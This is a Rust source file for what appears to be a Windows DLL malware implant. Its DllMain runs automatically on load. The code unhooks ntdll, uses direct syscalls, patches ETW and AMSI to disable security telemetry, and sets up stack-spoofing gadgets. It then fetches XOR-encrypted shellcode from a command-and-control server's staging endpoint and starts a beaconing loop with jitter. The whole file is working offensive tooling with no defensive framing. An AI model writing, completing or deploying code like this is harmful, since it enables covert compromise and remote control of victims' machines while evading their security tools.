pub mod core;

use ::core::sync::atomic::AtomicBool;

static mut SHELLCODE_CACHE: Option<Vec<u8>> = None;
pub static MIGRATED: AtomicBool = AtomicBool::new(false);

pub fn set_shellcode(sc: Vec<u8>) {
    unsafe { SHELLCODE_CACHE = Some(sc); }
}

// pub fn get_shellcode() -> Vec<u8> {
//     unsafe { SHELLCODE_CACHE.as_ref().cloned().unwrap_or_default() }
// }

/** Debug output macro
 * This will always print in debug builds AND in release builds with verbose feature
 * */
#[macro_export]
macro_rules! debug {
    ($($arg:tt)*) => {
        #[cfg(any(debug_assertions, feature = "verbose"))]
        println!("[DEBUG] {}", format_args!($($arg)*));
    };
}

// Build time generated key
include!(concat!(env!("OUT_DIR"), "/xor_key.rs"));
// C2 Configuration
include!(concat!(env!("OUT_DIR"), "/c2_config.rs"));

#[unsafe(no_mangle)]
pub unsafe extern "system" fn DllMain(_instance: *mut ::core::ffi::c_void, reason: u32, _reserved: *mut ::core::ffi::c_void) -> i32 { unsafe {
    const DLL_PROCESS_ATTACH: u32 = 1;

    if reason == DLL_PROCESS_ATTACH {
        beacon_entry();
    }
    1 // TRUE
}}

unsafe fn beacon_entry() { unsafe {
    use core::net::beacon;
    use core::net::transport::HttpSession;
    use core::{etw, amsi, ntdll_unhook, spoof, ssn_table};

    if !ssn_table::initialize_syscalls(::core::ptr::null_mut()) {
        return;
    }

    let unhook_result: Option<usize> = ntdll_unhook::unhook_ntdll();
    if let Some(n) = unhook_result {
        if n > 0 {
            ssn_table::initialize_syscalls(::core::ptr::null_mut());
        }
    }

    etw::patch_etw();
    amsi::patch_amsi();
    spoof::initialize_spoof_gadgets();

    if !ssn_table::initialize_network() {
        return;
    }

    {
        let path: [u16; 11] = [
            b'/' as u16, b'a' as u16, b'p' as u16, b'i' as u16,
            b'/' as u16, b's' as u16, b't' as u16, b'a' as u16,
            b'g' as u16, b'e' as u16, 0,
        ];
        if let Some(session) = HttpSession::new(&C2_HOST, C2_PORT, C2_HTTPS) {
            if let Some(encrypted) = session.post(&path, &[]) {
                if encrypted.len() >= 100 {
                    let sc = xor_decrypt(&encrypted, &XOR_KEY);
                    if sc.len() >= 100 {
                        set_shellcode(sc);
                    }
                }
            }
        }
    }


    // Decrypt C2 secret and start beacon
    let c2_secret: Vec<u8> =  C2_SECRET_ENC.iter().enumerate().map(|(i, b)| b ^ XOR_KEY[i % XOR_KEY.len()]).collect();
    let c2_config: beacon::C2Config = beacon::C2Config {
        host: &C2_HOST,
        port: C2_PORT,
        use_https: C2_HTTPS,
        secret: &c2_secret,
        interval_ms: C2_INTERVAL,
        jitter_pct: C2_JITTER, 
    };

    beacon::beacon_loop(&c2_config);
}}

extern crate alloc;
use alloc::vec::Vec;

fn xor_decrypt(data: &[u8], key: &[u8]) -> Vec<u8> {
    data.iter().enumerate().map(|(i, b)| b ^ key[i % key.len()]).collect()
}